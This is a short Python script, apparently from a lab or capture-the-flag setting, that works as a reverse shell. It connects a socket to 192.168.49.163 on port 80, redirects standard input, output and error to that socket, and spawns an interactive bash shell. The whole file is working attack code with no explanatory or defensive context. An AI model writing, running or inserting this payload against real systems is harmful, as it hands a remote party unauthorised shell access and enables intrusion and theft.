import socket
import subprocess
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.49.163", 80))

# redirect stdin, stdout, and stderr to socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# spawn a shell
pty.spawn("/bin/bash")
